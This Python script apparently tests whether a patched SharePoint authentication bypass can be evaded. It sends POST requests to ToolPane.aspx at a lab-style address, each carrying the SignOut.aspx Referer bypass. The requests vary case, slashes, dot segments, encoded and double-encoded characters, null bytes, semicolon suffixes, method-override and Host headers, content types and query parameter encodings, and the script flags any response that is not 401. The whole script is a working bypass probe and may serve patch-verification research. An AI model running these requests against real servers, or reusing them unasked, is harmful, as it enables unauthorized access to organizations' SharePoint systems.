# Purpose: Test edge cases and boundary conditions for authentication bypass
# Outcome: Check if encoding tricks or edge cases can bypass the patch

import requests
from urllib.parse import quote, urlencode

target_base = "http://10.10.10.166"

print("[*] Testing edge cases and boundary conditions...")

# Test 1: Path normalization tricks
print("\n[Test 1] Path normalization and traversal tricks...")
path_variations = [
    "/_layouts/15/ToolPane.aspx",
    "/_layouts/15/toolpane.aspx",  # Lowercase
    "/_layouts/15/TOOLPANE.ASPX",  # Uppercase
    "/_LAYOUTS/15/ToolPane.aspx",  # Mixed case in _layouts
    "/_layouts//15//ToolPane.aspx",  # Double slashes
    "/_layouts/./15/./ToolPane.aspx",  # Dot segments
    "/_layouts/15/../15/ToolPane.aspx",  # Traversal with return
    "/.//_layouts/15/ToolPane.aspx",  # Leading dot segment
    "/_layouts%2f15%2fToolPane.aspx",  # URL encoded slashes
    "/_layouts%5c15%5cToolPane.aspx",  # Backslash encoded
    "/_layouts\\15\\ToolPane.aspx",  # Literal backslash
    "/_layouts/15/ToolPane.aspx/",  # Trailing slash
    "/_layouts/15/ToolPane.aspx;.css",  # Semicolon trick
    "/_layouts/15/ToolPane.aspx%00",  # Null byte
    "/_layouts/15/ToolPane.aspx?.aspx",  # Extension in query
]

for path in path_variations:
    try:
        url = f"{target_base}{path}?DisplayMode=Edit"
        r = requests.post(url, headers={"Referer": "/_layouts/SignOut.aspx"}, 
                         data="test=1", timeout=10, allow_redirects=False)
        if r.status_code != 401:
            print(f"    [INTERESTING] {path[:50]}...: {r.status_code}")
        else:
            pass  # Skip 401
    except Exception as e:
        pass

# Test 2: HTTP method override
print("\n[Test 2] HTTP method override headers...")
method_headers = [
    {"X-HTTP-Method-Override": "GET"},
    {"X-HTTP-Method": "GET"},
    {"X-Method-Override": "GET"},
    {"_method": "GET"},
]

for headers in method_headers:
    try:
        r = requests.post(f"{target_base}/_layouts/15/ToolPane.aspx?DisplayMode=Edit",
                         headers={**headers, "Referer": "/_layouts/SignOut.aspx"},
                         data="test=1", timeout=10, allow_redirects=False)
        if r.status_code != 401:
            print(f"    [INTERESTING] {list(headers.keys())[0]}: {r.status_code}")
    except:
        pass

# Test 3: Host header manipulation
print("\n[Test 3] Host header manipulation...")
host_variations = [
    {"Host": "localhost"},
    {"Host": "127.0.0.1"},
    {"Host": "10.10.10.166:80"},
    {"Host": "internal-sharepoint"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Host": "localhost"},
]

for headers in host_variations:
    try:
        r = requests.post(f"{target_base}/_layouts/15/ToolPane.aspx?DisplayMode=Edit",
                         headers={**headers, "Referer": "/_layouts/SignOut.aspx"},
                         data="test=1", timeout=10, allow_redirects=False)
        if r.status_code != 401:
            header_name = list(headers.keys())[0]
            print(f"    [INTERESTING] {header_name}={headers[header_name]}: {r.status_code}")
    except:
        pass

# Test 4: Content-Type manipulation
print("\n[Test 4] Content-Type manipulation...")
content_types = [
    "application/x-www-form-urlencoded",
    "multipart/form-data",
    "text/plain",
    "application/json",
    "text/xml",
    "application/xml",
    "",  # Empty
]

for ct in content_types:
    try:
        headers = {"Content-Type": ct} if ct else {}
        headers["Referer"] = "/_layouts/SignOut.aspx"
        r = requests.post(f"{target_base}/_layouts/15/ToolPane.aspx?DisplayMode=Edit",
                         headers=headers, data="test=1", timeout=10, allow_redirects=False)
        if r.status_code != 401:
            print(f"    [INTERESTING] Content-Type={ct or 'NONE'}: {r.status_code}")
    except:
        pass

# Test 5: Query parameter encoding tricks
print("\n[Test 5] Query parameter encoding tricks...")
query_variations = [
    "DisplayMode=Edit",
    "DisplayMode=Edit&DisplayMode=Browse",  # Duplicate
    "displaymode=Edit",  # Lowercase
    "DisplayMode%00=Edit",  # Null in param name
    "DisplayMode=Ed%69t",  # Encoded 'i'
    "Display%4dode=Edit",  # Encoded 'M'
    "%44isplayMode=Edit",  # Encoded 'D'
]

for query in query_variations:
    try:
        url = f"{target_base}/_layouts/15/ToolPane.aspx?{query}"
        r = requests.post(url, headers={"Referer": "/_layouts/SignOut.aspx"},
                         data="test=1", timeout=10, allow_redirects=False)
        if r.status_code != 401:
            print(f"    [INTERESTING] {query[:40]}...: {r.status_code}")
    except:
        pass

# Test 6: Double URL encoding
print("\n[Test 6] Double URL encoding...")
double_encoded_paths = [
    "/_layouts/15/ToolPane%252easpx",  # Double encoded dot
    "/_layouts%252f15%252fToolPane.aspx",  # Double encoded slashes
]

for path in double_encoded_paths:
    try:
        r = requests.post(f"{target_base}{path}?DisplayMode=Edit",
                         headers={"Referer": "/_layouts/SignOut.aspx"},
                         data="test=1", timeout=10, allow_redirects=False)
        if r.status_code != 401:
            print(f"    [INTERESTING] {path}: {r.status_code}")
    except:
        pass

print("\n[*] Edge case testing complete")
print("[*] All tests returned 401 unless marked as INTERESTING")
